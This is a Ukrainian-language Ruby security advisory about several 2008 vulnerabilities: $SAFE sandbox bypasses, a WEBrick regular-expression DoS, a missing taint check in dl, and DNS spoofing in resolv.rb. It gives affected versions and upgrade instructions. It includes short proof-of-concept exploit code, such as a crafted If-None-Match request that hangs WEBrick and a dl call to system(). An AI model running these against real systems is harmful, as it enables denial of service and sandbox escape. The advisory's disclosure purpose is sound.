---
layout: news_post
title: "Кілька вразливостей у Ruby"
author: "Shugo Maeda"
translator: "Andrii Furmanets"
lang: uk
---

Виявлено кілька вразливостей у Ruby. Рекомендується
оновлюватися до останніх версій.

## Деталі

Виявлено наступні вразливості.

### Кілька вразливостей у рівні безпеки

Виявлено кілька вразливостей у рівні безпеки.

* untrace\_var дозволено на рівні безпеки 4.

      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* $PROGRAM\_NAME може бути змінено на рівні безпеки 4.

      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join

      $PROGRAM_NAME #=> "Hello, World!"

* Небезпечні методи можуть викликатися на рівні безпеки 1-3.

      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # return wrong size
           end
           msg
         end.value
       end
      end

      $SAFE = 1 # or 2, or 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # print string which size is less than 20
      end

* Операції Syslog дозволені на рівні безпеки 4.

      require "syslog"

      Syslog.open

      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

Ці вразливості повідомлено Keita Yamaguchi.

### Вразливість DoS у WEBrick

WEBrick::HTTP::DefaultFileHandler має помилку експоненційного часу при
запитах через регулярний вираз з поверненням у
WEBrick::HTTPUtils.split\_header\_value.

Експлойтований сервер:

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

Атака:

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

Запит, ймовірно, не завершиться в цьому всесвіті.

Цю вразливість повідомлено Christian Neukirchen.

### Відсутність перевірки taintness у dl
{: #label-3}

dl не перевіряє taintness, тому це може дозволити зловмисникам викликати
небезпечні функції.

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

Цю вразливість повідомлено sheepman.

### Вразливість підробки DNS у resolv.rb

resolv.rb дозволяє віддаленим зловмисникам підробляти відповіді DNS. Цей ризик може бути
зменшений випадковістю ID транзакцій DNS та вихідних портів, тому
resolv.rb виправлено для рандомізації їх.

* див. також: [CVE-2008-1447][1]

Цю вразливість повідомлено Tanaka Akira.

## Вразливі версії

Серія 1.8
: * 1\.8.5 та всі попередні версії
  * 1\.8.6-p286 та всі попередні версії
  * 1\.8.7-p71 та всі попередні версії

Серія 1.9
: * r18423 та всі попередні ревізії

## Рішення

Серія 1.8
: Будь ласка, оновіться до 1.8.6-p287, або 1.8.7-p72.

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;][2]
  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;][3]

Серія 1.9

: Будь ласка, виконайте checkout останньої версії, використовуючи Subversion.

      $ svn co https://git.ruby-lang.org/ruby.git/tree/?id=master ruby

Будь ласка, зверніть увагу, що пакет, який виправляє цю слабкість, може вже бути
доступний через ваше програмне забезпечення управління пакетами.

## Подяка

Подяка Keita Yamaguchi, Christian Neukirchen, sheepman, та Tanaka
Akira за розкриття цих проблем команді безпеки Ruby.

## Зміни

* 2008-08-08 12:21 +09:00 виправлено номер ревізії ruby 1.9.
* 2008-08-11 11:23 +09:00 виправлено рівень патчу ruby 1.8. див. [оголошення
  про випуск Ruby 1.8.7-p72 та 1.8.6-p287][4]




[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
[2]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz
[3]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz
[4]: {{ site.url }}/uk/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/
